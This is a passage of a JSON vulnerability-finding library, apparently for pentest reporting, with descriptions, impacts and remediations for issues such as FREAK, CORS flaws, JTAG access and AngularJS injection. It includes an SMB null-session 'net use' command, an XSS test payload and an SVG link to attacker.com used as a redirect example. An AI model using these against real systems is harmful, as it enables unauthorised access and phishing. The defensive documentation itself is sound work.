them.\n","cvss_base_score":6.8,"cvss_temporal_score":5.6,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:P/A:P/E:F/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":732,"plugin_id":null,"title":"HTTPS FREAK Information Leakage (SSL/TLS)","type":null,"description":"The server's SSL/TLS configuration is vulnerable to the FREAK attack. The FREAK (Factoring RSA Encryption Keys) attack allows an attacker to weaken the encryption strength between a client and server by exploiting purposefully weakened encryption schemes. FREAK takes advantage of RSA key pairs that have moduli of 512 bits or less. If an attacker can Man-in-the-Middle the initial connection, they can force the client and server to downgrade encryption strength.\n","poc":null,"impact":"The FREAK attack allows an attacker to downgrade the encryption scheme used by the application, enabling man-in-the-middle (\"MitM\") attacks. With the ability to perform a MitM attack, an attacker can gain access to sensitive information sent by the application, as well as potentially edit traffic in transit between the client server. This can lead to a loss of both confidentiality and integrity. Due to the affordability of cloud computing, the attack can be made more potent against the newly downgraded encryption parameters.\n","remediation":"RSA keys of at least 2048 bits should be used, and any export grade ciphers should be disabled. Any RSA key in use prior to upgrading the OpenSSL packages should be revoked and new ones should be put in place. In order to patch OpenSSL, clients and servers should have versions 1.0.2a,1.0.1m,1.0.0r and 0.9.8zf or higher installed.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":733,"plugin_id":null,"title":"Encryption Used with no Integrity Check","type":null,"description":"The application uses an encryption cipher that does not provide or perform integrity checking. Integrity checks exist to detect whether a piece of data has not been modified from its original form, either through data loss or by an attacker. Many attacks on encryption, such as padding oracle attacks and chosen ciphertext attacks, rely on modifying the ciphertext in certain ways to gain information. Without some form of message integrity checksum during encryption, there is no way to ensure that an attacker has not tampered with the message in transit.\n","poc":null,"impact":"An attacker that can access ciphertext encrypted without an integrity check can modify it without being detected. This gives the attacker the ability to perform any attack involving modifying the ciphertext to gain information (e.g. padding oracle attacks, chosen ciphertext attacks), which can lead to a complete compromise of the encrypted data's confidentiality and integrity.\nFor example, padding oracle attacks work by modifying ciphertext in a way that alters block cipher padding and observing the results of this modification. An attacker in this scenario is looking for information about whether the ciphertext he or she has sent has the \"correct\" padding format. By combining this information with how the ciphertext was modified, attackers can gain enough information to decrypt messages one byte at a time, starting with the padding.\n","remediation":"The application should use an authenticated encryption mode. Authenticated encryption provides confidentiality, integrity, and authenticity assurance, allowing users of the encrypted data to be certain that the data was encrypted by the right person, has not been modified since, and has remained secret. This is accomplished using a message authentication code, or MAC. These are typically hash-based functions performed on either the plaintext or the ciphertext. There are three common strategies for this: Encrypt-then-MAC (EtM), Encrypt-and-MAC (E&M), and MAC-then-Encrypt (MtE). EtM provides authentication and integrity checking without needing to decrypt the message first, and is the recommended way to use a MAC. E&M and EtM derive the MAC from the plaintext, so the ciphertext must be decrypted before the receiver can verify the message for integrity and authenticity.\nFor example, a cipher such as \"AES/GCM/NoPadding\", using Galois/Counter mode (GCM), can be used to verify the encrypted data, as implementations of this mode provide the IV and MAC separately from the ciphertext. A full list of authenticated encryption modes is available at the NIST Computer Security Resource Center:\nhttp://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html#01\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":734,"plugin_id":null,"title":"IIS Detailed Error Information Disclosure","type":null,"description":"IIS is configured to return detailed error messages to application end users. A detailed error message is returned by the IIS server when an HTTP error is encountered. This includes \"400 Error Bad Request\", \"401 Error Unauthorized\", \"403 Error Forbidden\", \"404 Error Not Found\", and \"500 Error Internal Server Error\". Depending on the type of error, the error message returned by IIS can vary, but overall the following information will be included in a detailed error message:\n--Description of error\n--Error code\n--Notification\n--Module\n--Requested URL\n--Physical path\n--Logon user\n--Logon method\n--Potential causes/solutions\n\n","poc":null,"impact":"The presence of detailed server errors may result in the exposure of sensitive application and server details. This can include information about the application's design, underlying libraries, middleware, OS, and server. Such information allows an attacker to more efficiently target the system with specific types of attacks.\n","remediation":"The IIS server should be configured to display custom generic error pages, and not display detailed error messages to end users. To disable detailed error messages on the IIS server the \"errorMode\" option in the \"httpErrors\" tag of the web.config file should be set to \"Custom\" or \"DetailedLocalOnly\". Both of these options can be used to display custom error pages to external users that encounter an error. The \"DetailedLocalOnly\" option will return a detailed error message to users accessing the application on the system where the server is hosted, allowing application teams to view detailed messages when troubleshooting issues.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":735,"plugin_id":null,"title":"Dangerous HTTP Request Methods or Headers Allowed via CORS","type":null,"description":"The application's Cross-Origin Resource Sharing (CORS) policy allows untrusted origins to make HTTP requests to the target origin using dangerous HTTP request methods or headers, and read the HTTP responses. An application can decide which HTTP methods and HTTP request headers can be used during a CORS request (via the Access-Control-Allow-Methods and Access-Control-Allow-Headers HTTP response headers, respectively). For example, the following portion of an HTTP response from a web service that uses the Access-Control-Allow-Methods HTTP response header to expose additional methods such as the PUT method.\n<pre>Access-Control-Allow-Origin: https://someothersite Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: HEAD,GET,POST,PUT,OPTIONS </pre>\nConsider the case were a web service returns public information about a user via a GET HTTP request, and allows user profile information to be altered via a PUT request. The whitelisting of these additional HTTP requests methods allows for an untrusted origin to exploit the target web service by altering the victim's account settings.\n","poc":null,"impact":"The inclusion of dangerous HTTP methods or headers can result in the unrestricted execution of JavaScript from an untrusted origin.  JavaScript executing in this manner is able to initiate an HTTP request against the target origin and read the HTTP response. Depending on how the web service was designed this may allow an attacker to perform operations on behalf of an authenticated victim.\n","remediation":"Disable any HTTP methods or headers not needed for the web server to function properly.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":736,"plugin_id":null,"title":"Improper Validation of the CORS Origin HTTP Request Header","type":null,"description":"The application improperly validates the Origin HTTP request header and reflects the Origin header value back in the HTTP response via the Access-Control-Allow-Origin HTTP response header. As a result, application resources are exposed to untrusted origins via Cross-Origin Resource Sharing. The Origin header is always sent with cross-origin requests by a CORS-compliant browser. This tells the target application the protocol, domain, and port of the originating request.\n","poc":null,"impact":"JavaScript executing in an untrusted origin can initiate an HTTP request to the target origin and read the HTTP response. Failing to properly validate the origin could lead to a compromise where an attacker is able to access user data or perform sensitive operations through a victim's browser. For instance, consider an application that allows communication from example.org but fails to properly validate the full origin. Since example.org only checks if the Origin string ends with example.org, an attacker could register evilexample.org and attack the application by luring authorized users to their domain.\n","remediation":"If the application's resources are intended to be accessed by multiple origins, the supplied origin header must be properly validated so that it matches one of the trusted origins. This is especially important for applications that allow authenticated cross-origin requests. Origin should be validated against a fixed white-list of trusted origins, and be validated against the full origin string rather than just a sub-string of the origin, to avoid common validation mistakes.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":737,"plugin_id":null,"title":"Sensitive HTTP Response Headers Exposed via CORS","type":null,"description":"The application exposes sensitive information in HTTP response headers via Cross-Origin Resource Sharing to untrusted origins. By default, JavaScript in a trusted origin can only access the following HTTP headers via CORS:\n--Cache-Control\n--Content-Language\n--Content-Type\n--Expires\n--Last-Modified\n--Pragma\n\n<pre>HTTP/1.1 200 OK Access-Control-Allow-Origin: <Origin reflected from HTTP request> Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: Authentication-Token Authentication-Token: AhZabSrmkA2O9w1Udf919VSJEbOR1S1EvpzyrBPz09kQ </pre>\nIn this example, an attacker can trick the victim into visiting an untrusted origin containing JavaScript that makes an HTTP request to the target origin. The malicious JavaScript code reads the authentication token and returns it to the attacker, who can then impersonate the victim since the attacker can directly interface with the web service and use the authentication token.\n","poc":null,"impact":"JavaScript executing in an untrusted origin can initiate an HTTP request to the target origin and read the HTTP response headers. Any sensitive data exposed in the HTTP headers will be leaked to the origin containing the malicious JavaScript. Depending on the information contained in the HTTP response headers, an attacker could leverage this information to hijack the user's session or learn additional information about the user or the target system.\n","remediation":"The Access-Control-Expose-Headers HTTP header should be removed from application responses. If the application requires this header to be sent, all  sensitive information must be stripped from the header prior to being sent to untrusted origins.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:20","updated_at":"2018-11-12 09:25:20","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":738,"plugin_id":null,"title":"Plaintext Serial Interface","type":null,"description":"Serial connections made to the device are unencrypted; as a result, data transferred over the communication channels/bus lines is sent in clear text. Serial communications handle data processing by sending data one bit at a time, sequentially, over a communication channel or a bus interface, increasing reliability and speed of data transfer.\n","poc":null,"impact":"Serial interfaces that communicate over unencrypted connections are vulnerable to multiple types of exposure. Any sensitive data sent to or from this serial interface can be intercepted by an attacker to be viewed or modified. For example, an attacker may intercept secret key data used to sign packages transferred to the device during software updates. If the attacker captures the keys, they can sign and deploy malicious packages on the device. Additionally, any functionality the device exposes will be directly accessible, allowing an attacker to execute functionality they are not otherwise authorized to access.\n","remediation":"Implement authenticated encryption on top of the communications protocol to prevent attackers from eaves dropping or manipulating data passed via the serial interface. Security measures for serial communications must be built on top of the communications protocol used for transfer (rather than into the serial line itself) since serial communications are relatively easy to monitor.\nAuthentication is recommended in addition to channel encryption to add tamper protection, and prevent an attacker from manipulating encrypted data in transit. If message re-use is a concern, include a unique value as part of the data blob being encrypted (e.g. timestamp or additional session token).\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":739,"plugin_id":null,"title":"Missing JTAG Protection","type":null,"description":"Access to the device is allowed via JTAG port. Device firmware and memory are often accessible through debugging and programming interfaces such as the JTAG port. Many embedded microprocessors have methods for disabling or limiting this access by using programmable fuses or other settings in the device firmware.\n","poc":null,"impact":"If the JTAG port is not disabled, an attacker may be able to recover device firmware or sensitive data (e.g. cryptographic secrets) from flash or RAM. Additionally an attacker may also be able to write new, modified firmware to the device memory, or analyze the firmware to discover new attack vectors.\n","remediation":"Always fully disable JTAG or other \"in-circuit programming\" interfaces that allow flash or RAM data to be read. If necessary, these interfaces can be enabled during debugging, and turned off for all production devices. Often these changes can be reversed, but only after all data on the device has been erased. Consult the device datasheet for details of the protection modes available, and ensure that the highest protection mode is enabled. While this may not prevent all attacks; an attacker may still send the hardware to a lab to have the firmware read from the device directly or have the fuse setting changed, but it increases the barrier to such an attack.\nAdditionally, any firmware update mechanisms or bootloaders should be reviewed to ensure that they do not allow for reading of code or memory, bypassing protection settings of the device. If verification of successful programming operations is required, the bootloader should be written in such a way that it provides a hash of the regions that have been written, instead of reading flash directly back to the programming tool.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":740,"plugin_id":null,"title":"Glitch Attack (Clock)","type":null,"description":"The system does not sufficiently protect against clock glitching, a type of fault injection attack. Fault injection attacks involve introducing an error in a computing device with the goal of altering software execution. Software execution may be altered to avoid executing a certain instruction or corrupt data the processor is working with. In general, fault injection attacks are often used to compromise embedded device security by bypassing security checks or leaking private keys.\nA clock glitch is a momentary increase of the system clock frequency. In a digital integrated circuit (e.g. a microcontroller, processor, FPGA, etc.), the clock signal is not distributed evenly and doesn't reach every physical point at one time. This is due to physical differences in distribution paths including length and capacitance in traces and transistor gates.\nThe maximum working frequency specified by the manufacturer is the maximum speed at which the clock signal can still reach every physical point in the IC. Running the IC beyond this limit causes failures since various components are no longer in sync. If the IC is forced to run beyond its maximum working frequency for only one instruction, it is possible to force the CPU to skip that instruction and resume normal operation with the next instruction.\n","poc":null,"impact":"An attacker may leverage this attack to bypass code-level security checks such as authentication and authorization verification by skipping specific program instructions. Introducing longer glitches may allow the attacker to skip entire branches of execution all together.\n","remediation":"Implement a combination of hardware and software countermeasures to protect against glitch attacks. Hardware countermeasures include (but are not limited to):\n--Active and Passive shielding\n--Supply Voltage monitoring and Buffering\n--Temperature Sensors\n--Implementing a secondary internal clock to compare\n--Optical sensors on die\n\n--Erasing secrets when hardware protections are tripped\n--Multiple comparison of sensitive results\n--Branchless algorithms\n--Random wait loops\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":741,"plugin_id":null,"title":"Microsoft Windows SMB NULL Session Authentication","type":null,"description":"The remote host allows \"null session\" logins (i.e. logins requiring no username or password). A null session can be created easily via the Windows NetBIOS program using the following command in the Windows command prompt:\n<pre><code class=\"dos\">net use \\\\<Host Name> OR <IP Address>\\ipc$ \"\" \"/user:\" </pre>\nThe \"net\" command takes the following parameters:\n--The host name or the IP address of the machine with which you want to establish a null connection\n--A blank username and password combination.\n\n<pre><code class=\"dos\">C:\\windows> net use \\\\10.11.12.200\\ipc$ \"\" \"/user:\"  The command completed successfully.  C:\\windows> net use New connections will be remembered  Status\tLocal\t\tRemote\t\t\t\tNetwork \t\t OK\t\t\t\t\\\\10.11.12.199\\ipc$\t\tMicrosoft Windows Network OK\t\t\t\t\\\\10.11.12.200\\ipc$\t\tMicrosoft Windows Network  The command completed successfully. </pre>\n","poc":null,"impact":"A network-based attacker can establish an unauthenticated connection to a remote SMB share,  bypassing authentication on the target system. Sensitive information may be exposed including (but not limited to):\n--Specific versioning of the operating system, including the service pack\n--The computer name, including the NetBIOS name, domain name, forest name, FQDN, and NetBIOS domain name\n--System time, up to the second\n--Information about shares, such as share name, and access permitted\n\n","remediation":"Disable NetBIOS on the target system and verify that ports 139 (used by Windows NT for NetBIOS Session Service) and 445 (SMB over IP; used for all versions of Windows after NT) are closed. If the Windows system and applications rely on the use of NetBIOS, null session access can be controlled by editing the following key in the Windows registry:\n<pre><code class=\"dos\">Key Name             : \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA\"  Value Name           : \"RestrictAnonymous\" Type                 : DWORD Allowed Values       : 0 / 1 / 2 </pre>\nThis key's default value is 0, allowing unrestricted null sessions. Setting this key to 1 does not prevent null sessions entirely but restricts them by blocking enumeration of SAM (Security Account Manager) and user accounts and blocking access to admin shares. Setting the key value to 2 disables null session access without explicit permissions, though this may conflict with application relying on null sessions.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":742,"plugin_id":null,"title":"Trace Debugging Method in Use (Flex)","type":null,"description":"While performing automated security scans of the SWF file(s) associated with the application, there was an indication that the trace () function is being utilized due to the presence of debug messaging in the SWF file for the application. This represents a potential security concern as path names and other information may be revealed.\n","poc":null,"impact":"\n","remediation":"Remove all debug messaging from the application code before it is placed on production servers. Before an application moves into production, make sure that information of potential value to an attacker is not left in the application code.\nSet 'Omit Trace Actions' to 'true'. The Omit Trace Actions flag in Flash development environments tells the compiler to remove any trace commands when creating the compiled SWF file. This will make the published SWF smaller and it will remove any excess information or actions from the SWF.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":743,"plugin_id":null,"title":"Angular - Expression Injection","type":null,"description":"The application is vulnerable to Expression Injection. In AngularJS, expressions are code snippets that are evaluated in the browser. When untrusted user input is passed to an expression, it may be evaluated. Even though AngularJS expressions are not passed to JavaScript's \"eval\" function directly, they are still processed by the AngularJS $parse service and can be treated as valid code.\nExpression injection often occurs as a result of evaluating untrusted user input directly within an expression or mixing client-side and server-side templates. If untrusted data is evaluated as an AngularJS expression, it will be parsed as code with access to the current scope object.\n","poc":null,"impact":"Expression injection can allow an attacker to call global $rootScope and child or isolated scope objects where the attacker can modify variables and call functions. Depending on the application's functionality, an attacker may be able to invoke privileged functionality by modifying a variable or calling an AngularJS method through the vulnerable expression. If a malicious payload contains JavaScript, it may be executed as valid JavaScript. This can lead to other vulnerabilities, such as DOM-based Cross-Site Scripting, depending on the expression evaluation method and how the data is handled by the application.\nNote that although AngularJS expressions are executed with access to the $scope object, AngularJS versions up to 1.6 all have sandbox bypasses, which allow to execute JavaScript outside of the AngularJS sandbox. And AngularJS version 1.6 and later do not have a sandbox implemented. Therefore, any injection can result in a DOM-based Cross-Site Scripting.\n","remediation":"Avoid using untrusted user input to generate templates and expressions. If user input must be used to generate templates and expressions, then the following steps should be taken:\n--Untrusted input should not be evaluated as an expression or used to generate templates (especially with $eval expressions). Validated the input first.\n--Avoid passing untrusted input to methods or services that parse expressions.\n--Separate client and server templates to ensure user input is safely returned to the view. Alternatively, avoid using server-side templates and just use client-side templates.\n\n--Reduce the scope of the ngApp directive. This directive is used to bootstrap Angular to a page, and reducing this scope can help limit the attack surface of where Angular expression injections can happen.\n--Explicitly ignore elements within an Angular app. The ngNonBindable directive can be used on elements within the scope of ngApp to instruct Angular to ignore them, which may add an additional layer of protection against the rendering of malicious templates. This control should be used when the application has to process end-user input and render it to the view.\n--Escape end-user input. End-user input should be escaped on the server-side including escaping the AngularJS special characters for interpolation expressions (double curly braces \"{{\" and \"}}\"). They should be escaped by preceding each of their characters with a REVERSE SOLIDUS U+005C (backslash).\n\n","cvss_base_score":8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:C/A:P)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:28:21","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":744,"plugin_id":null,"title":"Angular - Disabled Strict Contextual Escaping","type":null,"description":"Strict Contextual Escaping (SCE) is disabled in the application. SCE, when enabled, imposes restrictions on data rendering by considering all input untrusted by default and only allowing trusted values in views. For example, consider binding arbitrary HTML controlled by the user via ng-bind-html directive. If ng-bind-html is used and the data being displayed is <img src=x onerror=prompt(1)>, then the data after being processed by SCE would be sanitized to just <img src=x>.\nSCE is configured manually by setting the $sceProvider.enabled() to true or false within the config block of a module. Setting this option to false, disables SCE completely.\n","poc":null,"impact":"If SCE is disabled, by setting the $sceProvider.enabled() to false, an application can allow user controlled input to be rendered as-is, which may introduce security vulnerabilities such as XSS.\n","remediation":"Ensure the SCE service is enabled on the application. AngularJS versions 1.2 and newer have SCE enabled by default. However, it can be disabled in the configuration using a false boolean value passed to the $sceProvider.enabled() function. Removing the line entirely or setting the value to true will enable SCE. The AngularJS versions before 1.2 do not have the SCE service. Therefore, if these versions are used, it is highly recommended to upgrade to the latest version of AngularJS.\n","cvss_base_score":5.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":745,"plugin_id":null,"title":"Angular - Untrusted Data Marked Safe","type":null,"description":"The application marks data from untrusted sources as safe and passes it to DOM elements. Angular provides built-in context-aware sanitization that makes values displayed in different contexts on the page automatically safe. It allows developers to write code that is intended to be secure by default from attacks such as XSS. To bypass this automatic escaping and display data as is, as well as execute scripts within it, developers are required to explicitly mark the data trusted.\n","poc":null,"impact":"An attacker may be able to pass malicious XSS payloads to the trusted variable, which, when rendered, will allow the attacker to execute the actions a user can execute, such as reading sensitive data or performing sensitive actions.\n","remediation":"Review the data source to make sure it can be trusted. After reviewing the data source, only use the functions allowing to bypass sanitization on data that can truly be trusted. Also check if the HTML rendered from the data can be added directly to the template; then the source will only have the non-HTML data. In this case you may eliminate the use of such functions and minimize the attack surface.\n","cvss_base_score":3.6,"cvss_temporal_score":2.7,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:P/A:N/E:POC/RL:W/RC:UC)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":746,"plugin_id":null,"title":"Sensitive Data Stored Unencrypted in Local Storage (Web)","type":null,"description":"The application stores sensitive data in the client-side local storage. Applications can store data locally within the user's browser using HTML5 Web Storage. There are two types of storage, namely, session storage and local storage. Data stored in local storage does not expire, while data stored in session storage is only kept till the end of a session (e.g. closing of the browser or a tab). Web Storage stores data per origin (e.g. https://example.com), which allows multiple pages from the same origin to share data (e.g. all https://example.com pages can access each other's data).\nThe application persists sensitive data beyond a user's session by storing it in client-side local storage in an unencrypted fashion.\n","poc":null,"impact":"Storing sensitive data in local storage may result in data being exposed to an attacker:\n--An attacker with local access to a user's web browser can access the local storage.\n--Cross-site scripting attacks may access sensitive data since local storage does not prevent JavaScript loaded from the same domain from accessing the stored data.\n--Applications hosted on the same origin will be able to access each other's data stored in local storage. As a result, weaknesses in one application may enable attackers to access sensitive data stored by another application.\n\n--Personally identifiable information\n--Authentication credentials/tokens\n--Account data\n--Credit card information\n\n","remediation":"--Use session storage instead of local storage, as the session storage object is available only to that window/tab until the window/tab is closed.\n--Ensure that sensitive data in session storage is cleared programmatically prior to logout.\n--If an application is storing sensitive data in session storage, ensure that the data is being sent over SSL/TLS.\n--Do not store session identifiers in local storage as the data is always accessible by JavaScript. If cookies are used for session identifiers, use the HTTPOnly flag for the session identifier to mitigate this risk.\n\n","cvss_base_score":5.6,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":747,"plugin_id":null,"title":"Angular - SVG Content Allowed in Untrusted Data","type":null,"description":"The application allows SVG elements in user input. Angular provides a built-in $sanitize service that only allows a safe substet of HTML tags in user input when it is added to the page. In Angular versions before 1.5.0 SVG elements in the $sanitize service were enabled by default, only after in version 1.5.0 and after it became an opt-in feature. SVG elements can be enabled by calling $sanitizeProvider.enableSvg(true). \nThe application explicitly enables the use of SVG elements in the untrusted data that is passed into ng-bind-html elements. Although any JavaScript inside the SVG element will be automatically removed by the $sanitize service, an attacker can still exploit SVG tags in a different way.\nFor example, if an SVG tag contains event handlers, such as onmouseover or onclick, they will be filtered out. However, an SVG element may still contain a link tag that, when clicked, redirects a user to a malicious website, as shown in the example below.\n<pre><svg class=\"randomClass\" x=\"100\" y=\"100\" width=\"75\" height=\"25\">   <a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href='http://www.attacker.com'>     <rect height=\"25\" width=\"75\" stroke=\"#000000\" fill=\"#ffffff\" x=\"355\" y=\"-20\" ></rect>     <text x=\"370\" y=\"-5\" fill=\"#000000\">Submit</text>   </a> </svg> </pre>\n","poc":null,"impact":"Enabling SVG elements in user input may make the application vulnerable to UI redress or click-jacking attacks. An attacker may craft an SVG element that will be positioned outside of the containing element and overlay another element on the page, such as a button. Then a user is tricked to click the button and, as a result, is redirected to a malicious site. An attacker may use this technique to gain access to user's credentials or other sensitive data through phishing attacks.\n","remediation":"Disable the use of SVG elements in user input by correctly configuring $sanitizeProvider. In AngularJS version 1.5 and later, set $sanitizeProvider.enableSvg(false) or remove this call completely, as by default the SVG elements are disallowed. Unfortunately, there is no way to limit the SVG elements in the $sanitize service, in AngularJS versions prior to 1.5. Therefore, it is highly recommended to update the AngularJS version. \nIf the application requires the use of SVG elements in the user input, it is possible to provide another protection to the application without disabling the use of SVG. This can be accomplished by adding a CSS style that disallows SVG elements to be positioned outside of the containing element and be rendered over other elements on the page.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":748,"plugin_id":null,"title":"Hard-coded Secrets in Client-side Code (Web)","type":null,"description":"The application hardcodes secrets in client-side code. Hard-coded secrets in client-side JavaScript files are accessible by anyone with access to the application, including an attacker with a browser. An attacker can easily obtain a hard-coded secret by inspecting the page source. Since the secret is revealed in the client-side code, an attacker does not need access to the code repository as typically required by server-side code. Moreover, often times JavaScript files are accessible to unauthenticated users.\n","poc":null,"impact":"Once attackers obtain the secret, they can do several things, depending on the type of the secret. If it is an API key, attackers may be able to invoke that API by spoofing an Angular application. If the key is an encryption key, they may be able to decrypt any data encrypted with that secret. \nFor example, an application may use a library, such as CryptoJS, with a client-side secret used to encrypt a credit card number. This encrypted credit card number is then stored in the browser local storage. Since attackers have access to the encryption secret, they will be able to decrypt the credit card number and retrieve the plaintext value from the local storage.\n","remediation":"Redesign the client application so that hard-coded secrets are not necessary. The exact remediation depends on the secret's purpose. Some common scenarios and their respective remediations are discussed below.\n--Scenario 1: The client-side application encrypts or decrypts a value with a hard-coded encryption key. The application should be redesigned so that client-side encryption is not used, which would eliminate the need to set and store secrets client-side. Server-side encryption may be used instead.\n--Scenario 2: The client-side application uses a hard-coded API key to access an API. The application should be redesigned so that a hard-coded API key is not necessary, e.g. by using the implicit grant of OAuth 2.\n\n","cvss_base_score":3.5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:21","updated_at":"2018-11-12 09:25:21","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":749,"plugin_id":null,"title":"Passwords Hashed on the Client Side","type":null,"description":"The client uses hashes of user passwords for authentication. The client hashes passwords, sends these hashed passwords to the server for authentication, and the server validates these hashes by comparing them with the hashes stored in a database. While client-side hashing may be appropriate in certain use cases, hashing user passwords on the client is not effective if these passwords are not re-hashed on the server.\n","poc":null,"impact":"An attacker can bypass the authentication mechanism by sending hashes stolen from the database (e.g. via an SQL injection) without knowing the original passwords. Therefore, server-side comparison of a client-side hash against a database of stored hashes is as secure as using passwords without hashing.\n","remediation":"Redesign the application so that 